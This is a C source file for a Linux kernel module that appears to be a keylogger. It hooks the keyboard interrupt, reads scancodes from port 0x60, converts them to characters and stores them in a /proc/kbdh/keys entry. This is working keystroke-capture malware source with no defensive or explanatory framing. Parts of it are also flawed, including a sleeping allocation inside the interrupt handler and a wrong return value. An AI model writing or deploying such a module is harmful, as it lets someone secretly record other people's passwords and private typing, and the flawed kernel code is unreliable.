#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#include "keyp.h"
#include "fs.h"

#define IRQ_N	1
#define DATA_PORT	0x60 /* byte-width port input */

static int DEBUG = 0;
module_param(DEBUG, int, 0);
MODULE_PARM_DESC(DEBUG, "1 to enable debugging, default 0");

static DEFINE_SPINLOCK(kbdlock);

static struct proc_dir_entry *parent;

irqreturn_t irq_kbdh_handler(int irq, void *dev_id)
{
	unsigned int scancode; /* Hardware generated scan-code */
	char *key;
	
	/* Wait is not possible for us, since this function is called many times */
	key = kmalloc(MAX_SIZE, GFP_KERNEL | GFP_NOWAIT);
	if (!key)
		return -EFAULT;

	spin_lock_irq(&kbdlock);
	scancode = inb(DATA_PORT);
	
	if (scancode == (char)0 || (scancode & 128) == 128) /* Empty string or key-released */
		goto out;
	if (kbd_char(scancode, key) < 0)
		goto out;

	append_to_keys(key);
	spin_unlock_irq(&kbdlock);
	kfree(key);

	/* Debugging messages in this function will spam the kernel ring buffer
	 * too much so I'd rather not to. */

	return IRQ_HANDLED;

out:
	if (spin_is_locked(&kbdlock))
		spin_unlock_irq(&kbdlock);
	kfree(key);
	return IRQ_NONE;
}

static int __init sys_handler_kbd_init(void)
{
	int ret;

	parent = proc_mkdir("kbdh", NULL);
	proc_create("keys", 0, parent, &proc_fops_keys);

	ret = request_irq(IRQ_N, irq_kbdh_handler, IRQF_SHARED, "irq_keyboard",
						(void *)irq_kbdh_handler);
	if (ret < 0)
		return ret;

	if (DEBUG)
		printk(KERN_INFO "%s: Successfully created an IRQ handler and /proc entry\n",
							 THIS_MODULE->name);

	return ret;
}

static void __exit sys_handler_kbd_exit(void)
{
	proc_remove(parent);
	free_irq(IRQ_N, (void *)irq_kbdh_handler);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Roi roeil4939@gmail.com");

module_init(sys_handler_kbd_init);
module_exit(sys_handler_kbd_exit);
